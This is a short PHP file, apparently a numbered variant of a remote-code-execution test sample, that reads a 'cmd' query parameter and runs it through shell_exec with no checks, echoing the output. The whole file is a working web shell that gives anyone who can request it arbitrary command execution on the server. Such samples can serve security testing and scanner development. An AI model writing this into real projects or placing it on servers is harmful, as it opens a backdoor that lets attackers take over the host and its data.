<?php
// RCE test variation #244
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>